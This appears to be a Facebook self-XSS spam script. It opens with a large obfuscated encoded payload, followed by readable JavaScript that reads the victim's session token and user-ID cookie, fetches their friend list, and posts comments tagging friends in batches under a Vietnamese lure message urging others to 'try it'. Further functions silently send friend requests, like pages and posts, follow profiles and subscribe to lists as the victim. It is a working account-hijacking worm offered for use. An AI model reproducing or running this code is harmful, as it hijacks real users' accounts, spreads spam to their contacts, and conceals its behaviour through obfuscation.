152e1s1d1d2c1u3d1d2e1s3f1c2c1s3d1e2c1q3e1d2e1r3d1d2c1u3d1d2e1u3g1r2c1t1e1f2c1r1g1b2e1s3c1j2c1v1e1s2e1t1g162c1s2c1w2c1r3f152e1t2c1v2c1u3e132e1t1f1f2c1s3e1h2c1s3f1b2e1s1d152c1u3c1d2e1t3f102c1t3d1d2c1r3f1c2e1u1d1g2c1w1d1g2e1s1g1h2c1s1c1v3e1d2e1s3e1d2c1s3d1f2c1q3f1r2e1u3d1b2c1t3d1c2e1u3f1b2c1u3e1e2c1r3f172e1s2d1f2c1u3d1r2e1u3f1c2c1t3e172c1r3f172e1s2e172c1v1d152e1s2f1d2c1s3d1s2c1s3g1d2e1t3d172c1u2d1d2e1s3f162c1u3e192c1r3f172e1s3d1f2c1u3d1a2e1u3f172c1t3d172c1q3f1c2e1s3d172c1w3d1b2e1t3g152c1s3e1f2c1q3f172e1u3d1c2c1v1e152e1s3f1d2c1s3d1a2c1q3f1t2e1u3d1d2c1v1e152e1s2f1d2c1s3d1c2c1s3g1b2e1t3e172c1u1d1d2e1s3f192c1u3e1e2c1r3f172e1s2d1f2c1u3d172e1u3f182c1t3e172c1q3f1c2e1s3d1c2c1w3d182e1u3f1a2c1u3e1t2c1s3g1b2e1t3d172c1u1d152e1s3f1d2c1s3e1f2c1q2g1t2e1s3e172c1u3d1d2e1s3f1b2c1t1e172c1r3g172e1u1e1l2c1v3e1u2e1t3f1g2c1s2c1m2c1r3g1a2e1s2c1l2c1u3d1k2e1s3g1k2c1s1e1b2c1r3e172e1t3d1e2c1u1d1y2e1u3g1b2c1t3e1f2c1q3g1f2e1s3d1c2c1u1d1a2e1s3g1d2c1t3e1a3c142e1s2e172c141f1u1k1e1e1c1k2e121g1e3g1f1d1g3e141d1g1g1j1g1r2c1k1e1w2c1p1g1g2e1s1c1w2c1t2c1i2e1u2e142c1u2e1m2c1q1f192e1s2e1r2c1u2e1v2e1s2g1w2c1u3d102c1q2e1w2e1q1d1m2c1r2e1t2e1t3g1e2c1u2c1u2c1q1f1r2e1r2e1v2c1s2c1u2e1s2g1c2c1w1c1z2c1q3e1r2e1s2c162c1s2e1k2e1u1e1i2c1w3c1h2c1s2f1z2e1q3c112c1t1d1s2e1s1f152c1v3c162c1q3f182e1s3d1a2c1s1d152e1s3e192c1u3d172c1s3g1t2e1q1d1b2c1s3d1c2e1s3f152c1u3e162c1q1f192e1q3d1i2c1s3d152e1u3f122c1u2d192c1q3f1z2e1q3d1b2c1s3d1u2e1s3f172c1v3d1e2c1q3f172e1q3c1d2c1s3d162e1t3f172c1u1d172c1r3e192e1q3d192c1s3d172e1s2e1s2c1u2c1w1c1d1e123e141c1m3e1b1c123e121f121e1u2c1b1c1o3e183e1d1c1i3e141d1f3g191f1d3d1u1e1m3c1b1e1c3f1q2d1r1c1b3c1b3g1c1e1k1e1e1e1c3e1d1e1s1f1d3c1f1d161e1q1f1b1f1h3d1e3e1g3d1e2e1c1e1o3d1e3d1j3d163f142e181c1e3d1f3d163g1c1f1k3c141d141c1c1e1d3f1q3d1k1d1f1d1k1g1d1e123c1u3d1m3c163e1t1e1d3e1i1e1i3d151g1e1e1j1c1e1c1f2c1q1f1c3f1k1e1e3c1k1d1k3e121f1s1e1v2c1u3e1b2e1u3f1p2c1w3d1d2c1r3f152e1q3e192c1t3e152e1t1g132c1u3d1f2c1q3f1r2e1s3d1b2c1t3d152e1s3f1b2c1t3d1f2c1q3e1d2e1p3d1e2c1s3d1b2e1u3f192c1v3d172c1q3f1d2e1q3d1d2c1u3d1b2e1t1f132c1u3d1f2c1q3f1b2e1s3d1b2c1t3d152e1s3f1b2c1u3d1m2c1s3g182e1r3e192c1s2d1d2e1s1f1i2c1w3d1e2c1r3f152e1q3d1e2c1s3d1a2e1u3f1a2c1t3d1c2c1r3g152e1q3d1e2c1s3d172e1u3f1a2c1v3d172c1q3f1d2e1q3d1d2c1u3d192e1t1g132c1u3d1f2c1q3f1p2e1s3d1c2c1t3d152e1s3f1b2c1u3d182c1s3g1b2e1r3d192c1t3e152e1t1g192c1v3d172c1q3f1d2e1q2d1e2c1s3d192e1s3f182c1u3d1c2c1q3e1d2e1q3d1a2c1u3d182e1u2e132c1v3c172c1p2g1r2e1r3e1f2c1t3e1k2e1u1f1b2c1v1d1x2c1q3e102e1r1d1q2c1u1e1g2e1t2f132c1v2e1f2c1q3g1k2e1r2d1f2c1s1e172e1u1f1a2c1u1d1e2c1q2f152e1r3d192c1t3d1a2e1t3e1t2d192c1s3d1a2e1s3f182c1u3d1l2c1s3g192e1r3d1f2c1t2d1b2e1t2f172c1v3d152c1q2f1d2e1q3d1a2c1u3d1c2e1t1f152c1u3e152c1q3f1r2e1q1e192c1s3d1d2e1s3f1r2c1w3d1b2c1r3f152e1q3d1e2c1s3d182e1u3f1c2c1v3d152c1q3f1d2e1q3d1b2c1u3d182e1t1f152c1u3d1d2c1q3f1c2e1s3d1e2c1t3d152e1s2f1d2c1u3d1m2c1s3g1b2e1r3e192c1s2d1d2e1s3f1r2c1w3e1b2c1s3g1a2e1r3e192c1s3d1d2e1s3f192c1w3d1c2c1r3f152e1q3d1e2c1s3d1j2e1u3f1a2c1v3e152c1q3f1d2e1q3d1a2c1u3d182e1t1f152c1u3d1d2c1q3f1r2e1s3d1c2c1t2d192e1u3f1b2c1w3d1b2c1r3f152e1q3d192c1s1d1d2e1r3f1d2c1t3d1d2c1q3f1r2e1q3d1e2c1s3d1b2e1u1e122c1u1e1e2c1q3g1q2e1s1e1q2c1t1e1b2e1s3e1v2c1w1e152c1q3f192e1q1e1f2c1s2d1c2e1t2g1k2c1u1e1x2c1r1f1c2e1r1d192c1s3d152e1t2f152c1v1e152c1r1g1d2e1r3e1h2c1t3d1g2e1t3g1b1d1y2c1r3d1b2e1s3f1b2c1t3d1f2c1q3f1b2e1s3d1f2c1u3d1p2e1u3f1p2c1w3d1d2c1r3g172e1q2d1e2c1s1d1a2e1u3f192c1v3d102c1r3f172e1r3d122c1t1d132e1s3f1b2c1u3d1t2c1s3f1d2e1r3e192c1s3d1b2e1s3f1k2c1w3d192c1r3f172e1q3d1e2c1s3d1c2e1u3f1a2c1v3e172c1q3f1c2e1q3d1c2c1u3d192e1t1f132c1u2d1f2c1q3f1c2e1s3d1f2c1t1d132e1s2f1b2c1u3d1r2c1q3f182e1s3d1c2c1t1e132e1s3f1b2c1u3d1c2c1s3f1b2e1r3d192c1s1d1b2e1s1f1k2c1w3d1a2c1r3f172e1q3d1e2c1s3d192e1u3f162c1v3d172c1q3f1c2e1q3d1a2c1u3d1p2e1u3f132c1u3d1c2c1s3f1b2e1r3e192c1t1d132e1s3g132c1u3e172c1q3f172e1r3d192c1s1d1b2e1s1e1w2c1u1d172c1q1f1y2e1s3d1d2c1t1e132e1t3e1h2c1u1c1r2c1q2f172e1r1c1t2c1t1e132e1t1g1v2c1w3c1i2c1r1f172e1r1e1r2c1s3e182e1s2g1t2c1v1e1h2c1r1g1h2e1s3e1f2c1u3e1c2e1u2g1h2c1h2d1u2d1y2f1w2e10122d2d1g2j2f2m2b2f1g2g141m','05d6f2935313w331w391e25302o1b3v3c1b3o021z1m252z3q2m253c2o2o2w23381e252z1g3c29381a2v3s1z311m360w1z3139213v2z3b361a2v3s113z1m2z162v3z2n1z203a231q25333e142z2v233e1w3s271z1138231q25353c143z261y101z141z153v392o1721341s3s2t213n1z3u243e133v392o192z34101z1o231z3u26113u261z3u281z3u2o2z3b213v3c29233v29213v272y393v2c111z2233143q00303c293y121m3c1b3q0z3z2k22113z1m2z1z113s271z2z1f393v3c181y10302v3u2u333c101z1e1m1z133v29211t302o14232520332e1626332z1f1e183c1431261w1z1011303s271z121m3s350z31223314332j1s3d1j1e1k1d1d1c1q3f1h2e1o3d1f3e163e1k1g1g1c1f2d1e3c1q3d1k2e1r3c1x2c1u3e1w2c1t2e1w2c1q3d1k2c1q2c182e1q3c1p2c1u2c1o2c1t1e1e2c1s2c142c1s2c1z2e1q2c192c1u2e1c2c1t3g1h2c1q2c1u2c1q1e142e1s2e1p2c1s2c1x2c1u2e1e2c1s3c1t2c1s2e1w2e1r2c1r2c1u2e1e2c1t2e1v2c1s2d1y2c1s2c182e1q2e1v2c1u2e192c1s1f142c1s3e1v2c1q3d192e1q3d172c1s1d162c1s3g1x2c1q2d192c1q3c1i2e1q2d152c1u3d122c1s2f152c1r3d1l2c1q2d192e1s3d122c1s3d172c1u3e1a2c1q2d172c1s3d1d2e1q3d152c1t3d1d2c1s3f152c1q3e1b2c1q2d172e1r3d1x2c1s3d142c1u3g182c1q2d182c1s3e1v2e1q3d152c1s3d172c1s3f1s2c1q2c1u2c1d1c1h3f1e1e1e3e1u1d121e1s2g1b3c1g3e121d123d1g1e1e3c1q1e1q3e1d3c1j3e1d1d193e1j2d163e123e173d1d1e1g3d1e2c1c3f1q3d1i3c1l1c1g1e1h3f1a1c1f3c1b2d1i3e183f1d3c181e1g3e121d1h1e101c181c1a1c181c1a3g1k1e1q1d1b2d191d1p3f1d3d1e1e1d1d1k3c122e123d1y1c1f3d1d3e1k3g1r1e1q1c1d1d183e1s1e1q3c1e3d1e3e121d1i1g1q1d1e3c1u2d1f3d1c3e1d1d1i3c123e1d3d1g1g143e1h2c1s2d1r2c1s3g1b2c1q3d1f2c1q3d192e1s3e1k2c1u3d1r2c1u2f1p2c1s3d1d2c1r3e172e1q3d1b2c1s3d182c1u3g1a2c1r2d1d2c1r3e102e1r2d1a2c1t1d152c1s3f1b2c1q3d182c1s3e1d2e1r3d132c1s2d1d2c1s3f182c1s3d1b2c1r3d172e1q3d1b2c1s3d172c1u3g192c1r3e172c1q3d1c2e1q3d1i2c1u3d182c1t3f132c1q2d1f2c1q3d1c2e1s3d192c1t1d152c1s3f1b2c1q3c1f2c1q3d1t2e1s3d192c1t1d152c1s3f1b2c1q3d1f2c1s3e1b2e1r3d132c1s3d1d2c1s3f1p2c1s3d192c1r3d172e1q3d1b2c1s3d162c1u3g162c1r3e172c1q3d1c2e1q3d1c2c1u3d1r2c1s3f1o2c1q3d1b2c1s3e1d2e1r3d1a2c1t1d152c1t3f132c1r3e172c1r3e102e1r3d132c1s1d1d2c1r1g1p2c1r3e1x2c1r1d1k2e1r3d1i2c1u3e1b2c1s2g122c1s2e1b2c1s3e1x2e1q2d132c1u1d1f2c1t1f1a2c1r1d1l2c1q3e1f2e1q1d132c1t1d1j2c1u2g172c1r1d1b2c1r3d172e1r3e132c1t3c1a2c1t3g1t1d132c1t1d132c1t3g132c1r3d172c1q3d1c2e1q3d1a2c1s3d1b2c1s3f1b2c1q3d1d2c1s3d1d2e1r3e152c1s3d1b2c1s3f1c2c1s3e1t2c1s3d1d2e1s3d1r2c1u3d192c1t3f132c1q3d1f2c1q3d182e1s3d172c1t1e132c1s3f1b2c1q3d1c2c1s3d192e1r3d152c1s1d1b2c1s3f1b2c1s3e1d2c1r3d172e1q3d1d2c1s3d182c1u3g192c1r3e172c1q3d1c2e1q3d1p2c1u3d1a2c1t3f132c1q3e1t2c1q3d1c2e1q3d1p2c1u3d172c1t3f132c1q3d1f2c1q3d182e1s3d192c1t1e132c1s3f1b2c1q3d1r2c1s3d1d2e1r3d152c1s3d1b2c1s3f162c1s3e1a2c1r3e172e1q3d1d2c1s3d1b2c1s2f1b2c1q2e1f2c1q3d1b2e1s3d1b2c1u3d182c1t2g1a2c1r2e1d2c1p3d1d2e1s3d182c1t1d132c1s3g1v2c1s1e1l2c1s1e1r2e1r1e1b2c1s3c1h2c1t1f1u2c1r2c1q2c1s1d1c2e1r2c1d2c1t3d132c1t2g1b2c1q3e1m2c1q1e1b2e1r1d1c2c1s2e1c2c1t3e162c1r1e1h2c1r1d1h2e1q3e1b2c1s3e1c2c1s2g1i2c122c1t1d1b2c1r3f1a2c1r2d1d2c1r3e152e1q1d1b2c1s3d1d2c1s2f1d2c1q3d1f2c1q3d1r2e1s3d152c1t3e152c1s2f1d2c1q3d1b2c1q3d192e1q3d172c1s3d172c1u3f1b2c1r3e172c1q3d1d2e1q3d1k2c1u3d1a2c1t3f152c1q1d1f2c1q3d1c2e1s3d172c1t3d152c1s3f1d2c1q3d1d2c1s3e182e1r3d132c1s3d1d2c1s3f1b2c1s3d1d2c1r3d152e1q3d1b2c1s3d1a2c1u3f1c2c1r3d172c1r3e152e1q2d1b2c1s3d1j2c1u3f192c1r3d172c1q1d1d2e1q3d152c1u3d1c2c1t3f152c1q2d1f2c1q3d182e1s3d162c1t3d152c1s3f1d2c1q3d182c1s3e182e1r3d132c1s3d1d2c1s3f152c1q3e172c1q1e1d2e1q3d1o2c1s3d192c1u3f1r2c1s3d1t2c1s3e182e1q3d1c2c1u3d182c1t3f1w2c1s3d192c1q3d152e1r1e132c1t3c1j2c1t3g1u2c1q1e1v2c1q3d152e1r3e1s2c1u3e1d2c1s1g1g2c1r1d1z2c1r1d1c2e1r1d1b2c1u1c1d2c1t3g1h2c1q3e1m2c1q3e1k2e1q3d1i2c1s3d1k2c1s2g1q2c1q1d152d153c172f1r121f2t3g173d1q1c1b1c113e123e121e1i3d191e1c2e1k1e1v3e1i3e172c1r3e1v2e1s2c1v2c1w3e172c1u1f1w2c1t2e1s2c1q2d1y2e1r2e1o2c1v1c1s2c1t2e1q2c1s2c102c1q3c192e1s2e102c1u3c152c1t3g1x2c1s2c1y2c1s1c1o2e1r2c152c1u1c1j2c1s3g1d2c1u1c1g2c1q3e1g2e1s2d1x2c1v2e1h2c1u3g1r2c1u2e112c1q2c1c2e1s1c1x2c1w2c1f2c1s1f162c1u3d1c2c1q3d192e1q3d1a2c1u3d172c1u3f1j2c1s3d1b2c1r3c1d2e1q1d182c1w3d132c1s3f152c1t3d1f2c1q3d182e1s3e102c1u3d162c1s3f172c1s3d1a2c1q3c172e1q3d172c1u3c1b2c1s3f152c1s3d1q2c1q3d192e1s3e1c2c1u3d152c1s3f1h2c1s2d1a2c1s3d1b2e1q1d172c1u3d192c1s3e1x2c1s2c1m1c1f3c1c2f1c1c1h3b1e3d1d3c1b2e121c103b1f3e161d191f1d1e1g3d1i1c1d3d1c2f1i1c1o1c1k1d1f1e1c1e1f1c1b1d1m1d163d1c3e181e1g3d161d1f3c121f1u2d1j1d1a1c101b1d1g1c3e1p1c1d3c1d3e1j3g1c3d1e3e1g3d1c3c1c3f1d1e1k3d1m3d1u1e142e1c1c1b3c1f1e1f3d1p3e1w3e1c2d152c183d142f1d3c1g3c1k3c1d1c1s2f1k1c1c1e1d3d123e1d2g1g1e1k1d1j1c101e141e181e1r1e1d1c1c1c1w2e1s2e172c1u3d132c1s1g152c1s3d1e2c1q3d162e1q3d1a2c1u3d1c2c1s1f1c2c1u3d1f2c1r3e152e1q1d1c2c1u3d182c1u3f1b2c1u3d1d2c1p3d1b2e1s3e1b2c1v3d132c1s1f1d2c1s3d1f2c1s3d182e1r1d172c1u3d1b2c1s1f1a2c1u3d1c2c1r3d152e1q3d1c2c1u3d162c1u3f1b2c1t3e192c1q3d1d2e1q1d1q2c1w3d152c1t1g152c1s1d1e2c1q3d192e1s3e1d2c1v3d132c1s3f1d2c1s2d1e2c1q3d1b2e1s3e1d2c1v3d132c1s3f1d2c1s3d1e2c1s3d1b2e1r1e172c1u3d1b2c1s3f1a2c1u3d1d2c1r3e152e1q1d1c2c1u3d1b2c1u3f182c1t3d192c1q3d1d2e1q3d1c2c1u3d1b2c1s2f1d2c1s3d1d2c1s3d1b2e1s3e1d2c1v3d1w2c1t1f1y2c1t3d1d2c1p3d182e1r1d172c1u3d1d2c1u3f1c2c1t3d1d2c1r2c152e1r1e1t2c1v3e1c2c1s3g1q2c1u3c1h2c1r3c1y2e1q1e1d2c1u3e1i2c1t3f192c1u2e1r2c1r1e1u2e1q3d1x2c1w1d1q2c1u1f1g2c1u3d1k2c1r1d1j2e1r1d1o2c1v3d1j2c1t1e1w2d1c2c1v1d192c1t3f1y2c1t3e192c1q3d1c2e1q2d1d2c1t3d1b2c1r2f1d2c1s3d1e2c1s3d1d2e1r1d152c1u3d1b2c1s3f1r2c1s3d1v2c1s3e1d2e1q3d1r2c1w3d152c1t3g152c1s3d1e2c1q3d1s2e1s3e1c2c1v1d132c1s3f1d2c1s3d1e2c1s3d1b2e1r1d152c1u3d1b2c1s3f1a2c1u3d1e2c1r3d172e1q2d1d2c1u3d1b2c1u3f1a2c1t3e192c1q2d1c2e1q3d1b2c1w3d192c1t3g152c1s3d192c1q3d1c2e1q3d1d2c1w3d172c1t3f152c1s3d1e2c1q3d1b2e1s3e192c1v1e132c1s3f1d2c1s3d1d2c1s3d1a2e1r1d152c1u3d1b2c1s3f1a2c1u3d1c2c1r3e172e1q3d1d2c1t3d1b2c1s3f152c1s3d1e2c1q3d1c2e1s3d1a2c1w3d1a2c1u3f1c2c1u3d1f2c1s3e192e1s3e182c1v1d132c1u1f1d2c1u1d1h2c1s1e142e1q1e1b2c1w2e1h2c1t3e1v2c1t2d1d2c1s1d1w2e1p3e152c1u3d1i2c1s1g152c1t3c112c1s1d1i2e1r1d152c1u1d142c1s2f1a2c1s2d1e2c1q3e1d2e1r1e1b2c1v3e1b2c1t3g1d3c172c1w3d1b2c1u3f1c2c1u3d1d2c1r3d152e1q2d172c1u3e152c1s3g152c1s2d1f2c1q3d1q2e1s3e1d2c1v3d152c1s3f1d2c1s3c1f2c1q3d1p2e1q3c1c2c1u3d1p2c1u3f1b2c1t3e172c1q3d1d2e1q3d1s2c1w3d1c2c1t1g152c1s3d1f2c1q3d172e1s3e1b2c1v3d152c1s3f1d2c1s3d1a2c1s3e182e1r3d172c1u3d1d2c1s3f192c1u3d1c2c1r3d152e1q1d1c2c1u3d1a2c1u3f1a2c1t3e192c1r3d152e1q2d1c2c1u3d1p2c1u3f1c2c1t3d172c1q3d1d2e1q3d1c2c1w3d1b2c1t1g152c1s3d1f2c1q3d1p2e1s3e1a2c1v3d152c1s1f1d2c1s3d1e2c1s3e1a2e1r3d172c1u3e152c1t1f152c1t3d172c1q3e1d2e1q3d1c2c1u3d192c1s1f162c1s3d1t2c1q3d192e1q3d1c2c1w3d182c1t1e1h2c1t2d182c1r1c1d2e1q1d172c1w3d192c1t1g1x2c1t1e172c1r1d1p2e1s3e1c2c1v2d152c1t3e1g2c1s3e112c1r1d1a2e1q1e1f2c1u3d152c1u2e152c1t3e172c1r3e182e1r3e1f2c1v3d192c1t1g1c1c103c1u3c1y2c1t1e121i1d1e1g1e3e1u1e1j1d1b1c1h1f171d1f1d1d1c1j1c1s1g1j3c1s3d1e2c1s1c1g2e1q3c1z2c1u1c1v2c1s1f1p2c1t1c1g2c1s1d1v2e1r2c1p2c1u1e1v2c1r2e132c1u2c1y2c1s3c1c2e1s2c1r2c1s1d162c1q2e1s2c1s2e1k2c1t3c1x2e1s2e1y2c1t2c1y2c1q3f1i2c1s2c182c1s3c1p2e1s2c1q2c1t1c1g2c1s3e122c1u2c1z2c1s2c192e1s2e1e2c1t3e1j2c1q3f162c1s3c1f2c1s3d172e1q3e1b2c1s3d182c1r3e172c1s3d172c1s3c1f2e1q2d182c1u3c1d2c1q1f172c1s3c1h2c1s3d162e1s3d192c1s3d192c1q3e1x2c1s2d192c1s3d1c2e1q1d192c1s3d1c2c1q1f152c1t3e1b2c1s2d162e1q3d182c1s2d172c1r3e1h2c1s2d182c1s3d172e1q3d172c1s3d1t2c1q2e1s2c1f1c1f3b143e1d2f161e1c2e1f1c1i3d1k3f1w1e1c2c1f1e1c3d1f1e191d1k1d183d1d3c181f1e3e141d1h3d121d1u2f1h3d181c121b1c1d1c3f1k1c1b3c1d3d1j3d111f1j1c1i1d1h3d1g2c161e1d1d161e1s1d1j3c161e161c181c181c1s3e1h1e181c1a1e123b1c3d1a1e1g2d1c3d1f3c121d123g1b3c1c1d1e3d1j1e1d2e172d141d1f1c1c3c1d2f1g3d1a1e1g1d1c3e1i1f1f2c1s3d1j3d152d1c3f122d1e2d1c1c1f3d1d2e1r3e152c1t3d172c1r3f152c1s2d1d2c1s3d1d2e1q3c1d2c1s3c1c2c1q3f162c1u3d172c1t3d152e1q3d1d2c1s3d1c2c1s3g1b2c1u3d182c1u3e1b2e1s3e182c1t3d172c1q3f1d2c1s1d192c1u3d1b2e1r3e152c1s3d1c2c1q3f172c1u3d182c1t3d152e1q3d1d2c1s3d1d2c1s3f1b2c1t1d152c1s3d1d2e1q3d1p2c1u3d1b2c1r3g152c1s1d1d2c1s3d1a2e1s3e1b2c1t3d172c1q3f152c1s2d1d2c1s3d1c2e1s3e192c1t3d172c1q3f1d2c1s3d1d2c1u3d182e1r3d152c1s3d1c2c1q3f1d2c1u3d1b2c1t3d152e1q3d1d2c1s3d1d2c1s3f182c1t1d152c1s2d1d2e1q3c1d2c1r2d1c2c1q3f1d2c1s3d1a2c1u3d1r2e1s3e1c2c1r3d1d2c1p3f1b2c1u3d1b2c1u3d182e1r3e152c1u1e1v2c1r1f1c2c1t1e1w2c1t1d152e1s2d1c2c1t1c1k2c1s2e1d2c1r3d142c1u1c1g2e1q1e1b2c1s1e1p2c1s3g1x2c1t1d152c1t3e1y2e1r3e1d2c1u2c1f2c1r3g1d2c1t3d1v2c1u1d1a2e1s1d152c1t2d181c1u2e1q3e1b2c1u3d1d2c1p3f1c2c1t1d172c1s2d1b2e1q3d1r2c1s1d1t2c1q3f1d2c1s3d1t2c1u3d192e1r3d152c1s3d1c2c1q3f192c1s3d1a2c1s3d1k2e1q3d182c1u3d1d2c1r3f152c1s3d1f2c1s3d182e1s3e1b2c1t3d172c1q3f1d2c1s3d1b2c1u3d162e1r3e152c1s3d1c2c1q3f1a2c1u3d1a2c1t3d132e1q3d1d2c1s3d1s2c1s3f1b2c1t1d172c1s2d1b2e1q3d1r2c1u3d192c1r3f152c1t1d172c1s3d1b2e1q3d1a2c1u3d1c2c1r3f152c1s3d1f2c1s3d1a2e1s3e1a2c1t3d172c1q3f1d2c1s1d1b2c1u3d162e1r3d152c1s3d1c2c1q3f162c1u3d192c1t3d132e1q3d1r2c1s3e172c1r3g152c1s3d1f2c1s3d1a2e1q3d1b2c1u3e1a2c1s3g182c1u3d1c2c1s3d162e1s3e182c1t2d1f2c1r1g1d2c1t2e152c1t2e1i2e1q1d1d2c1u1e142c1r3e1f2c1u3e1c2c1u2c1d2e1q1d1p2c1t3c1z2c1r1f1j2c1t3e1f2c1t3e1i2e1q3e192c1t3d1u2c1s3g1b2c1u3e1d2c1s3d142e1q3d162c1s1e172c1i3e1r1e1d2c1u3d192c1s3g1a2c1u3d1b2c1t3e152e1r3d172c1t3e172c1r1f132c1s3d1d2c1s3d1p2e1s3d1b2c1t3e172c1q1f1b2c1s3d1d2c1s2d1d2e1q3d1c2c1s3d192c1s3f192c1t1d152c1s3d1d2e1q3d1c2c1u3d1d2c1r1g132c1s3d1d2c1s3d1a2e1s3d1a2c1t3d172c1q3f1b2c1s3d1d2c1u3d182e1r3d172c1s2d1c2c1q1f1p2c1u3d1b2c1t3d152e1q1d1c2c1s3d1s2c1s3f192c1u3d1b2c1t3e152e1q2d1c2c1s3d1a2c1s3f162c1t1e152c1s2d1d2e1q3d1b2c1u3d1b2c1r1g132c1s3d1d2c1s3d172e1s3d1a2c1t3d172c1q1f1b2c1s3d162c1u3d1c2e1r3d172c1t3d102c1r2f192c1t1e152c1s3d1d2e1p3d1c2c1s3d1c2c1q1f162c1s1d1d2c1s2d1d2e1q3d1c2c1u3d1f2c1s2f1e2c1t1d1g2c1u1e1c2e1q1d1j2c1t3d1a2c1r2g1f2c1t1d1w2c1u2c1j2e1r3d1b2c1s1e1d2c1r1g1c2c1s2e1k2c1u3e1b2e1q3e142c1t1d1p2c1r1f1h2c1t1d1j2c1s3d152e1s3d172c1u1c1u2c1q1e1p2c1z2d1r2c1w1c172v1p2f2t1r2t1s1r1i2s1f14','ef09b2c43cf81d4ad91e09d2375de522'));
//Tag
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var id = "289221247907562";
var arkadaslar = [];
var svn_rev;
function arkadaslari_al(id){            
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/27);f++){
mesaj = "Tui làm đc rồi nè đẹp quá hehe (y) Cám ơn bạn nhiều nha. <3 <3 :* ☺ ẢNH đẹp cực kỳ luôn, thử ngay và luôn đi mọi người (tui chỉ muốn chia sẻ niềm vui với m.n thôi :3, nếu có làm phiền cho tui xin lỗi!";mesaj_text = "";
for(i=f*27;i<(f+1)*27;i++){
if(arkadaslar.payload.entries[i]){
mesaj += "  @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
mesaj_text += " " + arkadaslar.payload.entries[i].text;
}
}
yorum_yap(id ,mesaj)}                
}
};
var params = "&filter[0]=user";
params += "&options[0]=friends_only";
params += "&options[1]=nm";
params += "&token=v7";
params += "&viewer=" + user_id;
params += "&__user=" + user_id;
if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
xmlhttp.send();
}
function RandomArkadas(){
var sonuc = "";
for(i=0;i<9;i++){
sonuc += " @[" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].uid + ":" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].text + "]";
}
return sonuc;
}
function yorum_yap(id ,mesaj) {
 var xhr = new XMLHttpRequest();
 var params ="";
 params +="&ft_ent_identifier="+id;
 params +="&comment_text="+encodeURIComponent(mesaj);
 params +="&source=2";
 params +="&client_id=1377871797138:1707018092";
 params +="&reply_fbid";
 params +="&parent_comment_id";
 params +="&rootid=u_jsonp_2_3";
 params +="&clp={\"cl_impid\":\"453524a0\",\"clearcounter\":0,\"elementid\":\"js_5\",\"version\":\"x\",\"parent_fbid\":"+id+"}";
 params +="&attached_sticker_fbid=0";
 params +="&attached_photo_fbid=0";
 params +="&giftoccasion";
 params +="&ft[tn]=[]";
 params +="&__user="+user_id;
 params +="&__a=1";
 params +="&__dyn=7n8ahyj35ynxl2u5F97KepEsyo";
 params +="&__req=q";
 params +="&fb_dtsg="+fb_dtsg;
 params +="&ttstamp=";
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);

    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
}
        arkadaslari_al(id);
//CoderLike
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+":379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=>=&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
